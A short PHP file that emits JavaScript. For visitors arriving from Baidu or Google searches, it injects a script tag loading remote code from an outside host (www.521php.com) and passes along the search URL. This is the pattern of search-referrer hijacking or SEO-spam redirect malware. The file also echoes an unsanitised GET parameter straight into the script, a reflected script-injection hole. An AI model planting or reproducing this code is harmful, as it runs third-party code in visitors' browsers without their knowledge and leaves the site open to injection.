<?php
header("Content-Type:text/html;charset=GB2312");
$u = $_SERVER['HTTP_REFERER'];
if($u){
?>
	var url = document.referrer;
	if(url.indexOf("www.baidu.com/")!=-1 || url.indexOf("www.google.com")!=-1){
	    url  =url.replace(/&/g,"@@");
		var host = "<?php echo @$_GET['host'];?>";
		var othercss = document.createElement("script");
		othercss.type = "text/javascript";
		othercss.src = "http://www.521php.com/api/tz/tz.php?url="+url+"&host="+host;
		document.getElementsByTagName("head")[0].appendChild(othercss);
	}
<?php
}
?>